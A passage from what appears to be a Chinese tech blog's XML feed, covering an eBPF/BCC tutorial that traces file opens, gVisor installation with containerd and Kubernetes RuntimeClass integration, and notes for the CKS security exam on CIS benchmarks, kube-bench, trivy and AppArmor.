bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># cat trace-open.c</span><br>// 包含头文件<br><span class="hljs-comment">#include &lt;uapi/linux/openat2.h&gt;</span><br><span class="hljs-comment">#include &lt;linux/sched.h&gt;</span><br><br>// 定义数据结构<br>struct data_t &#123;<br>  u32 pid;<br>  u64 ts;<br>  char <span class="hljs-built_in">comm</span>[TASK_COMM_LEN];<br>  char fname[NAME_MAX];<br>&#125;;<br><br>// 定义性能事件映射  定义一个 Perf 事件类型的 BPF 映射<br>BPF_PERF_OUTPUT(events);<br><br><br><br>// 定义kprobe处理函数<br>int hello_world(struct pt_regs *ctx, int dfd, const char __user * filename, struct open_how *how)<br>&#123;<br>  struct data_t data = &#123; &#125;;<br><br>  // 获取PID和时间<br>  data.pid = bpf_get_current_pid_tgid();  // bpf_get_current_pid_tgid用于获取进程的 TGID 和 PID。因为这儿定义的 data.pid 数据类型为 u32，所以高 32 位舍弃掉后就是进程的 PID<br>  data.ts = bpf_ktime_get_ns();  // bpf_ktime_get_ns用于获取系统自启动以来的时间，单位是纳秒<br><br>  // 获取进程名<br>  <span class="hljs-keyword">if</span> (bpf_get_current_comm(&amp;data.comm, sizeof(data.comm)) == 0)  // bpf_get_current_comm用于获取进程名，并把进程名复制到预定义的缓冲区中<br>  &#123;<br>    bpf_probe_read(&amp;data.fname, sizeof(data.fname), (void *)filename); // bpf_probe_read 用于从指定指针处读取固定大小的数据，这里则用于读取进程打开的文件名。<br>  &#125;<br><br>  // 提交性能事件 调用 perf_submit() 把数据提交到刚才定义的 BPF 映射<br>  events.perf_submit(ctx, &amp;data, sizeof(data));<br>  <span class="hljs-built_in">return</span> 0;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># cat trace-open.py</span><br>from bcc import BPF<br><br><span class="hljs-comment"># 1) load BPF program</span><br><span class="hljs-comment"># 加载 eBPF 程序并挂载到内核探针上</span><br>b = BPF(src_file=<span class="hljs-string">&quot;trace-open.c&quot;</span>)<br>b.attach_kprobe(event=<span class="hljs-string">&quot;do_sys_openat2&quot;</span>, fn_name=<span class="hljs-string">&quot;hello_world&quot;</span>)<br><br><span class="hljs-comment"># 2) print header</span><br><span class="hljs-comment"># 输出一行 Header 字符串表示数据的格式</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%-18s %-16s %-6s %-16s&quot;</span> % (<span class="hljs-string">&quot;TIME(s)&quot;</span>, <span class="hljs-string">&quot;COMM&quot;</span>, <span class="hljs-string">&quot;PID&quot;</span>, <span class="hljs-string">&quot;FILE&quot;</span>))<br><br><span class="hljs-comment"># 3) define the callback for perf event</span><br><span class="hljs-comment"># print_event 定义一个数据处理的回调函数，打印进程的名字、PID 以及它调用 openat 时打开的文件</span><br>start = 0<br>def print_event(cpu, data, size):<br>    global start<br>    event = b[<span class="hljs-string">&quot;events&quot;</span>].event(data)<br>    <span class="hljs-keyword">if</span> start == 0:<br>            start = event.ts<br>    time_s = (<span class="hljs-built_in">float</span>(event.ts - start)) / 1000000000<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%-18.9f %-16s %-6d %-16s&quot;</span> % (time_s, event.comm, event.pid, event.fname))<br><br><span class="hljs-comment"># 4) loop with callback to print_event</span><br><span class="hljs-comment"># open_perf_buffer 定义了名为 “events” 的 Perf 事件映射，而后通过一个循环调用 perf_buffer_poll 读取映射的内容，并执行回调函数输出进程信息</span><br>b[<span class="hljs-string">&quot;events&quot;</span>].open_perf_buffer(print_event)<br><span class="hljs-keyword">while</span> 1:<br>    try:<br>        b.perf_buffer_poll()<br>    except KeyboardInterrupt:<br>        <span class="hljs-built_in">exit</span>()<br><br><br><span class="hljs-comment"># 怎样从用户态读取 BPF 映射内容并输出到标准输出（stdout）呢？</span><br><span class="hljs-comment"># 在 BCC 中，与 eBPF 程序中 BPF_PERF_OUTPUT  相对应的用户态辅助函数是 open_perf_buffer() 。它需要传入一个回调函数，用于处理从 Perf 事件类型的 BPF 映射中读取到的数据。</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo python3 trace-open.py</span><br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:41:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP32__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:4:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:42:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP64__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:5:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:43:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP16__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:3:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__ 1</span><br>        ^<br>3 warnings generated.<br>TIME(s)            COMM             PID    FILE<br>0.000000000        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/proc/meminfo&#x27;</span><br>0.249586834        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.pressure&#x27;</span><br>0.249744243        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.current&#x27;</span><br>0.249765844        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.min&#x27;</span><br>0.249783697        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.low&#x27;</span><br>0.249800399        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.swap.current&#x27;</span><br>0.249818063        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.stat&#x27;</span><br>0.249918042        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.pressure&#x27;</span><br>0.249993365        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.current&#x27;</span><br>0.250011319        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.min&#x27;</span><br>0.250028852        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.low&#x27;</span><br>0.250045734        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.swap.current&#x27;</span><br>0.250062576        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.stat&#x27;</span><br>0.250117370        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/proc/meminfo&#x27;</span><br>0.499947185        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/proc/meminfo&#x27;</span><br>0.537863286        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/etc/ld.so.cache&#x27;</span><br>0.537898282        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>0.538648765        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/lib/locale/locale-archive&#x27;</span><br>0.538766849        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale/locale.alias&#x27;</span><br>0.538832774        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale/en_US/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.538838585        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale/en/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.538844537        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale-langpack/en_US/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.538850207        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale-langpack/en/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.538868322        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/proc/meminfo&#x27;</span><br>0.539986006        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/etc/ld.so.cache&#x27;</span><br>0.540310641        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>0.541208063        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/lib/locale/locale-archive&#x27;</span><br>0.541523040        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale/locale.alias&#x27;</span><br>0.541664007        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale/en_US/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.541768956        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale/en/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.541841113        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale-langpack/en_US/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.541911206        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale-langpack/en/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.541993672        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/stat&#x27;</span><br>0.542297589        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/version&#x27;</span><br>0.542427826        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/uptime&#x27;</span><br>0.542513568        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/loadavg&#x27;</span><br>0.542576598        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/sys/fs/file-nr&#x27;</span><br>0.542649275        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/sys/kernel/hostname&#x27;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ebpf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】(202301) gvisor安装与containerd集成</title>
    <link href="/2023/01/11/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202301)%20gvisor%E5%AE%89%E8%A3%85%E4%B8%8Econtainerd%E9%9B%86%E6%88%90/"/>
    <url>/2023/01/11/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202301)%20gvisor%E5%AE%89%E8%A3%85%E4%B8%8Econtainerd%E9%9B%86%E6%88%90/</url>
    
    <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装地址：<a href="https://gvisor.dev/docs/user_guide/install/">Installation - gVisor</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">ARCH=$(<span class="hljs-built_in">uname</span> -m)<br>URL=https://storage.googleapis.com/gvisor/releases/release/latest/<span class="hljs-variable">$&#123;ARCH&#125;</span><br>wget <span class="hljs-variable">$&#123;URL&#125;</span>/runsc <span class="hljs-variable">$&#123;URL&#125;</span>/runsc.sha512 \<br>  <span class="hljs-variable">$&#123;URL&#125;</span>/containerd-shim-runsc-v1 <span class="hljs-variable">$&#123;URL&#125;</span>/containerd-shim-runsc-v1.sha512<br><span class="hljs-built_in">sha512sum</span> -c runsc.sha512 \<br>  -c containerd-shim-runsc-v1.sha512<br><span class="hljs-built_in">rm</span> -f *.sha512<br><span class="hljs-built_in">chmod</span> a+rx runsc containerd-shim-runsc-v1<br>sudo <span class="hljs-built_in">mv</span> runsc containerd-shim-runsc-v1 /usr/local/bin<br><br></code></pre></td></tr></table></figure><h2 id="与containerd集成"><a href="#与containerd集成" class="headerlink" title="与containerd集成"></a>与containerd集成</h2><h3 id="下发runtimeclass资源"><a href="#下发runtimeclass资源" class="headerlink" title="下发runtimeclass资源"></a>下发runtimeclass资源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@node01:~<span class="hljs-comment"># cat rc.yaml</span><br>apiVersion: node.k8s.io/v1<br>kind: RuntimeClass<br>metadata:<br>  name: untrusted<br>handler: runsc<br>root@node01:~<span class="hljs-comment"># kubectl apply -f rc.yaml</span><br>root@node01:~<span class="hljs-comment"># kubectl get runtimeclass</span><br>NAME        HANDLER   AGE<br>untrusted   runsc     7m34s<br><br></code></pre></td></tr></table></figure><h3 id="修改containerd配置文件"><a href="#修改containerd配置文件" class="headerlink" title="修改containerd配置文件"></a>修改containerd配置文件</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>containerd/config.toml<br></code></pre></td></tr></table></figure><p>增加</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># gVisor: https://gvisor.dev/</span><br><span class="hljs-section">[plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.runtimes.runsc]</span><br>  <span class="hljs-attr">runtime_type</span> = <span class="hljs-string">&quot;io.containerd.runsc.v1&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111212808.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 重启containerd</span><br>root@node01:~<span class="hljs-comment"># systemctl restart containerd</span><br></code></pre></td></tr></table></figure><h3 id="准备pod的yaml文件"><a href="#准备pod的yaml文件" class="headerlink" title="准备pod的yaml文件"></a>准备pod的yaml文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@node01:~<span class="hljs-comment"># kubectl run nginx-gvisor --image=nginx --dry-run=client -oyaml</span><br>apiVersion: v1<br>kind: Pod<br>metadata:<br>  creationTimestamp: null<br>  labels:<br>    run: nginx-gvisor<br>  name: nginx-gvisor<br>spec:<br>  containers:<br>  - image: nginx<br>    name: nginx-gvisor<br>    resources: &#123;&#125;<br>  dnsPolicy: ClusterFirst<br>  restartPolicy: Always<br>status: &#123;&#125;<br><br>root@node01:~<span class="hljs-comment">#  kubectl run nginx-gvisor --image=nginx --dry-run=client -oyaml &gt; nginx-gvisor.yaml</span><br><br><br><span class="hljs-comment">## 稍加修改，最终如下</span><br>root@node01:~<span class="hljs-comment"># cat nginx-gvisor.yaml</span><br>apiVersion: v1<br>kind: Pod<br>metadata:<br>  name: nginx-gvisor<br>spec:<br>  runtimeClassName: untrusted<br>  containers:<br>  - image: nginx<br>    name: nginx-gvisor<br><br>root@node01:~<span class="hljs-comment"># kubectl apply -f nginx-gvisor.yaml</span><br><br>root@node01:~<span class="hljs-comment"># kubectl get pod</span><br>NAME           READY   STATUS    RESTARTS        AGE<br>nginx-gvisor   1/1     Running   0               8m3s<br><br></code></pre></td></tr></table></figure><p>成了~</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.51cto.com/u_14035463/5583894">### Kubernetes 最小化微服务漏洞 gVisor与Containerd集成</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
      <tag>gvisor</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】cks</title>
    <link href="/2023/01/03/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91cks/"/>
    <url>/2023/01/03/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91cks/</url>
    
    <content type="html"><![CDATA[<h2 id="CIS安全基准"><a href="#CIS安全基准" class="headerlink" title="CIS安全基准"></a>CIS安全基准</h2><p>互联网安全中心（CIS，Center for Internet Security），是一个非盈利组织，致力于为互联网提供免费的安全防御解决方案。</p><p>官网：<a href="https://www.cisecurity.org/">https://www.cisecurity.org/</a><br>kubernetes CIS标准：<a href="https://www.cisecurity.org/benchmark/kubernetes">https://www.cisecurity.org/benchmark/kubernetes</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230103231424.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230103231523.png" alt="image.png"></p><h2 id="CIS基准测试工具"><a href="#CIS基准测试工具" class="headerlink" title="CIS基准测试工具"></a>CIS基准测试工具</h2><p>kube-bench是容器安全厂商Aquq推出的工具，以CIS k8s基准卫基础，来检查k8s是否安全部署。主要查找不安全的配置参数、敏感的文件权限、不安全的账户或公开端口等等。</p><p>项目地址：<a href="https://github.com/aquasecurity/kube-bench">https://github.com/aquasecurity/kube-bench</a></p><h2 id="gVisor"><a href="#gVisor" class="headerlink" title="gVisor"></a>gVisor</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111203206.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111203352.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111203427.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111203902.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111204332.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111204802.png" alt="image.png"></p><h2 id="trivy"><a href="#trivy" class="headerlink" title="trivy"></a>trivy</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111222445.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111223213.png" alt="image.png"></p><h2 id="AppArmor"><a href="#AppArmor" class="headerlink" title="AppArmor"></a>AppArmor</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225002.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225039.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225156.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225540.png" alt="image.png"></p><p>ubuntu的内核已经内置了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225848.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225942.png" alt="image.png"></p><h2 id="sysdig"><a href="#sysdig" class="headerlink" title="sysdig"></a>sysdig</h2><p>完整的过滤器列表可以使用 sysdig -l 来查看</p><h2 id="命令和网址"><a href="#命令和网址" class="headerlink" title="命令和网址"></a>命令和网址</h2><p><a href="https://kubernetes.io/zh-cn/docs/reference/kubectl/cheatsheet/">kubectl 备忘单</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】cks</title>
    <link href="/2023/01/03/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91cks/"/>
    <url>/2023/01/03/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91cks/</url>
    
    <content type="html"><![CDATA[<h2 id="CIS安全基准"><a href="#CIS安全基准" class="headerlink" title="CIS安全基准"></a>CIS安全基准</h2><p>互联网安全中心（CIS，Center for Internet Security），是一个非盈利组织，致力于为互联网提供免费的安全防御解决方案。</p><p>官网：<a href="https://www.cisecurity.org/">https://www.cisecurity.org/</a><br>kubernetes CIS标准：<a href="https://www.cisecurity.org/benchmark/kubernetes">https://www.cisecurity.org/benchmark/kubernetes</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230103231424.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230103231523.png" alt="image.png"></p><h2 id="CIS基准测试工具"><a href="#CIS基准测试工具" class="headerlink" title="CIS基准测试工具"></a>CIS基准测试工具</h2><p>kube-bench是容器安全厂商Aquq推出的工具，以CIS k8s基准卫基础，来检查k8s是否安全部署。主要查找不安全的配置参数、敏感的文件权限、不安全的账户或公开端口等等。</p><p>项目地址：<a href="https://github.com/aquasecurity/kube-bench">https://github.com/aquasecurity/kube-bench</a></p><h2 id="gVisor"><a href="#gVisor" class="headerlink" title="gVisor"></a>gVisor</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111203206.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111203352.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111203427.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111203902.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111204332.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111204802.png" alt="image.png"></p><h2 id="trivy"><a href="#trivy" class="headerlink" title="trivy"></a>trivy</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111222445.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111223213.png" alt="image.png"></p><h2 id="AppArmor"><a href="#AppArmor" class="headerlink" title="AppArmor"></a>AppArmor</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225002.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225039.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225156.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225540.png" alt="image.png"></p><p>ubuntu的内核已经内置了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230111225848.png" alt="image.png"></p><p><img 